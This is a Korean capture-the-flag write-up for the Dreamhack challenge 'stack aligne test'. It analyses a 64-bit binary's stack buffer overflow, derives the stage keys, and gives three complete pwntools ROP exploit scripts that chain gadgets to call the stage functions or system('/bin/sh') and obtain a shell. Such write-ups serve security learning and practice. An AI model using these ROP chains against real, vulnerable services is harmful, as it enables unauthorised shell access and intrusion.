# Level1:stack aligne test

## 문제 링크

---

https://dreamhack.io/wargame/challenges/1562

## 요구 개념

---

- [Stack Buffer Overflow](https://www.notion.so/6-Stack-Buffer-Overflow-9f34feaace1c49c0bff338b8e427eaf2?pvs=21)
- Return Oriented Programming

## Description

---

**간단한 ROP 문제입니다! 근데 이제 스택 정렬을 곁들인**

## 문제 분석

---

### 바이너리 실행

- `chall` 을 실행한 결과이다.
    
    ![스크린샷 2024-11-25 오후 6.29.59.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2024-11-25_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_6.29.59.png)
    
- 두 개의 스테이지가 존재하며, 각 단계의 키를 입력하여 플래그를 얻는 문제다.

### 익스플로잇 구성

- `checksec` 결과는 다음과 같다.
    
    ![스크린샷 2024-11-25 오후 6.24.13.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2024-11-25_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_6.24.13.png)
    
- `NX` 가 활성화되어있으므로, 코드 영역에 직접적으로 쉘 코드를 주입할 수 없다.
- `NX` 를 우회하는 공격인 ROP 공격을 채택하였다.

### gdb

- `gdb` 를 이용하여 `chall` 의 어셈블리를 확인해보았다.
- `main` 은 두 번의 출력 이후에 `vulnerable` 함수를 호출한다.
    
    ![스크린샷 2024-11-25 오후 6.33.32.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2024-11-25_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_6.33.32.png)
    
    ![스크린샷 2024-11-25 오후 6.36.19.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2024-11-25_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_6.36.19.png)
    

- `vulnerable` 은 `print_stage_info` 를 호출하고, `read` 함수로 사용자의 입력을 받는다.
    
    ![스크린샷 2024-11-25 오후 6.35.00.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2024-11-25_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_6.35.00.png)
    
    ![스크린샷 2024-11-25 오후 6.36.44.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2024-11-25_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_6.36.44.png)
    
- `vulnerable+8` 에서 스택을 `0x10` 만큼 할당했는데, `vulnerable+42` ~ `vulnerable+59` 에서 `0x100` 만큼의 입력을 받는다.
    - Stack Buffer Overflow 발생

- `print_stage_info` 는 stage1, stage2의 성공 여부를 알려주고, 초기 key 값을 출력한다.
    
    ![스크린샷 2024-11-25 오후 6.37.25.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2024-11-25_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_6.37.25.png)
    
    ![스크린샷 2024-11-25 오후 6.39.04.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2024-11-25_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_6.39.04.png)
    

- `main` , `vulnerable` , `print_stage_info` 에 관한 내용은 gdb를 이용하여 대략적으로 추측할 수 있었다.
    - `main` : `vulnerable` 호출
    - `vulnerable` : `print_stage_info` 호출 후, 사용자의 입력을 `read` 로 받음
    - `print_stage_info` : stage 1, stage 2가 해결 됐는지 아닌지 출력해줌
- 중요 포인트는 다음과 같다.
    - **입력을 단 한번만 받는다** → 한 번의 입력으로 모든 스테이지의 Key 값을 전달해야한다. → ROP 공격 확정
    - `main`, `vulnerable`, `print_stage_info` 에서는 **Stage 1, Stage 2를 해결하는 부분이 없다.**

### IDA

- IDA를 이용하여 `chall` 을 분석하였다.
- 왼쪽에 있는 함수 영역에서, `execute_stage1` , `execute_stage2` , `get_flag` 함수를 확인할 수 있었다.

![스크린샷 2024-11-25 오후 6.53.21.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2024-11-25_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_6.53.21.png)

- `execute_stage1` 는 `stage_key` 와 `0xCAFEBABE` 를 비트 XOR 연산하여 비교한다.
    - 첫 `stage_key` 는 `0xb526fb88` 이므로, stage 1의 Key는 `0xb526fb88 ^ 0xCAFEBABE` 의 결과이다.
- `stage_key ^= v3;` 코드가 존재하고, 이는 `stage_key` 에 `0xCAFEBABE` 를 대입하는 것과 같다.
    - Stage 2는 `0xCAFEBABE` Key를 이용하여 연산하여야 한다.

![스크린샷 2024-11-25 오후 6.54.14.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/ea44532f-67e2-4539-9d71-307a00564d91.png)

- `execute_stage2` 는 Stage 1이 해결되었는지 확인한다.
- 그 후, `stage_key` 와 `0xF00DBABE` 를 비트 XOR 연산하여 비교한다.
    - `execute_stage2` 를 호출할 때의 `stage_key` 는 `0xCAFEBABE` 이다.
    - `0xCAFEBABE ^ 0xF00DBABE` 의 결과가 Stage 2의 Key이다.
- `stage_key ^= v3` 은 `stage_key` 에 `0xF00DBABE` 의 결과와 같다.

![스크린샷 2024-11-25 오후 6.59.02.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2024-11-25_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_6.59.02.png)

- `get_flag` 는 Stage 1, Stage 2의 성공 여부를 확인 한다.
- 그 이후, `stage_key` 와 `0x12345678` 을 비트 XOR 연산한다.
- 함수를 반환하면서, `system("/bin/sh")` 를 수행한다.
    - **`get_flag` 함수만 성공적으로 반환하면, 쉘을 획득할 수 있다.**

![스크린샷 2024-11-25 오후 7.02.22.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2024-11-25_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_7.02.22.png)

## 구현

---

- 분석을 통하여 다음과 같이 익스플로잇을 계획하였다.
    - ROP 공격을 이용한다.
    - `execute_stage1` , `execute_stage2` 를 호출하여 Stage 1, Stage 2를 Clear한다.
    - `get_flag` 를 호출하여 쉘을 획득한다.

### objdump

- `objdump` 를 이용하여 `execute_stage1` , `execute_stage2` , `get_flag` 함수의 주소를 찾았다.

```jsx
$ objdump -d chall | grep execute_*
$ objdump -d chall | grep get_flag
```

![스크린샷 2024-11-25 오후 7.09.20.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2024-11-25_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_7.09.20.png)

- 주소는 다음과 같다.
    - `execute_stage1` : `0x4012a3`
    - `execute_stage2` : `0x40131a`
    - `get_flag` : `0x4013b6`

### ROPgadget

- `execute_stage1` , `execute_stage2` 에 인자를 전달해주기 위해, `pop rdi` 가젯을 찾았다.
    - `chall` 은 64비트 프로그램이므로, SYSV 함수 호출 규약을 사용한다.
        - `rdi -> rsi -> rdx -> rcx -> r8 -> r9 -> stack`
- Stack Alignment를 위해 `ret` 가젯을 찾았다.
    - 64비트 ROP 공격에서 `system` 함수를 사용할 때에는 `0x10` (16 바이트) 스택 정렬이 되어있어야 한다.
        - 이번 문제에서는 `check_alignment` 함수가 존재하기 때문에 스택 정렬을 해야한다.

```jsx
$ ROPgadget --binary chall --re="pop rdi"
$ ROPgadget --binary chall --re="ret"
```

![스크린샷 2024-11-25 오후 7.16.11.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2024-11-25_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_7.16.11.png)

![스크린샷 2024-11-25 오후 7.16.43.png](Level1%20stack%20aligne%20test%20517849c798d54705a3e2bf9e566ea3c0/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2024-11-25_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_7.16.43.png)

- 가젯 주소
    - `pop rdi` : `0x401565`
    - `ret` : `0x40101a`

### 익스플로잇

- 다음과 같이 익스플로잇을 작성하였다.
- 64비트 아키텍처에서 주소가 64비트(8바이트, `0x8`) 임에 유의하여, Stack Alignment를 해주어야 한다.
- 인텐 풀이

```jsx
from pwn import *

context.log_level = 'debug'

p = remote('host3.dreamhack.games', 17056)

print_stage_info = 0x40144e
execute_stage1 = 0x4012a3
execute_stage2 = 0x40131a
get_flag = 0x4013b6

pop_rdi = 0x401565
ret = 0x40101a

key = 0xb526fb88
key1 = key ^ 0xCAFEBABE
key2 = 0xCAFEBABE ^ 0xF00DBABE
key3 = 0xF00DBABE ^ 0x12345678

# print("key1 :", hex(key1))
# print("key2 :", hex(key2))

payload = b'A' * 0x10
payload += b'B' * 0x8
payload += p64(pop_rdi) + p64(key1)
payload += p64(ret) + p64(execute_stage1)
# payload += p64(ret) + p64(print_stage_info)

payload += p64(pop_rdi) + p64(key2)
payload += p64(ret) + p64(execute_stage2)
# payload += p64(ret) + p64(print_stage_info)

payload += p64(pop_rdi) + p64(key3)
payload += p64(ret) + p64(get_flag)

p.sendafter(b'Input: ', payload)

p.interactive()
```

```python
#!/usr/bin/python3
from pwn import *

p = process("./chall")
e = ELF("./chall")

pop_rdi = 0x401565
ret = 0x40101a
execute_stage1 = e.symbols['execute_stage1']
execute_stage2 = e.symbols['execute_stage2']
get_flag = e.symbols['get_flag']

p.recvuntil(b"key: ")
stage_key = int(p.recvuntil(b"\n"), 16)
#print(stage_key)

payload = b'A'*0x10 + b'B'*0x8
payload += p64(pop_rdi)+p64(stage_key^0xCAFEBABE)+p64(ret)+p64(execute_stage1)
payload += p64(pop_rdi)+p64(0xCAFEBABE^0xF00DBABE)+p64(ret)+p64(execute_stage2)
payload += p64(pop_rdi)+p64(0xF00DBABE^0x12345678)+p64(ret)+p64(get_flag)

p.sendlineafter(b"Input: ", payload)

p.interactive()
```

- 언인텐 풀이
    - ROP를 이용하여 바로 `system(/bin/sh)` 을 수행하도록 하는 방법도 있다.
        - `chall` 에 `/bin/sh` 문자열이 존재하므로 가능함
    - 참고 [https://velog.io/@rlajunwon/Dreamhack-stack-aligne-test](https://velog.io/@rlajunwon/Dreamhack-stack-aligne-test)

```jsx
from pwn import *

context.log_level = 'debug'
p = remote('host3.dreamhack.games', 21198)
e = ELF('./chall')

system = e.symbols['system']
binsh = 0x4020c4

pop_rdi = 0x401565
ret = 0x40101a

payload = b'A' * 0x10 + b'B' * 0x8
payload += p64(pop_rdi) + p64(binsh)
payload += p64(ret) + p64(system)

p.sendafter(b'Input: ', payload)

p.interactive()
```